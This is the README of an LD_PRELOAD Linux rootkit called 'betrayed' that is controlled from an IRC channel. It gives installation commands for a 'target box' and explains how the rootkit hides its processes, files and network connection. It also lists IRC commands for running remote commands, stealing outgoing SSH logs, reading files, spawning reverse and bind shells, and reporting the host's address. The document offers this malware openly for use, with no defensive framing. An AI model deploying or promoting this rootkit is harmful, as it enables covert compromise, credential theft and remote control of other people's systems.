
# betrayed
## basic info
 * betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.  
 * it is free of any dependencies, and installs near enough instantly.  
 * processes & files are hidden with a magic GID
 * the connection to the IRC server is hidden from plain sight. `netstat` and similar tools won't show the connection.
 * upon installation, betrayed will create its initial fork process wherein it will connect to the server and join the specified channel.
   * by default, betrayed will only create its process & connect to the server if the calling process has root privs. you can turn this off by defining `DM_ROOT` in the config header.

### usage
 * SEE `src/config.h` FOR SPECIFIC SETTINGS YOU MAY WANT TO CHANGE.
 * ANY OF THE CONFIGURATION VARIABLES DECLARED AT RUNTIME BY `install.sh` CAN BE CHANGED.
   * see function `write_conf` in install.sh for variables that can be altered @ runtime.
   * for example, `NICK` & `SONAME`
     * _example:_ `NICK=mynewnick SONAME=mynewsoname.so ./install.sh`
 * `./install.sh <host> '<channel>'`
   * _i.e.:_ `./install.sh host.org '#imgay'`
 * upon successful installation, `install.sh` will `cat /dev/null` straight away
   * causing betrayed to create its main connection process
   * without this, the rootkit will join the channel off of the next adequate process
 * _compile only:_ `COMPILE_ONLY=1 ./install.sh ...` compiles the rootkit in the cwd. 
once installed on the target box & assuming you are in your target channel, you will see a new user with a random nick join your channel. this is the box that you just installed betrayed on.

#### available commands
```
 IRC commands:
      to use a command, send "<CMD NAME> <NICK/all> [argument(s)]"
        "!EXEC", // executes given commands & sends resulting output to the channel.
        "!SSHL", // read outgoing ssh logs, send said logs to the channel.
        "!READ", // send file contents to the channel.
        "!REVR", // send a reverse shell to a given hort & port.
        "!BIND", // create a bind shell on given port.
        "!KILL", // remove the rootkit and all of its files and disconnect.
        "!DISC", // just disconnect. we will then reconnect when possible.
        "!INFO", // just send `uname -a` output to the channel.
        "!HELP", // send this command list to the channel.
        "!ADDR"  // send the address of the box to the channel. uses curl.
```

#### notes
##### hiding
 * betrayed hides itself from /proc/\*/maps, smaps, and numa_maps.
 * betrayed hides itself from `ldd`, among others.

##### connection
 * using !EXEC/!INFO may cause a short wait before you can do anything else.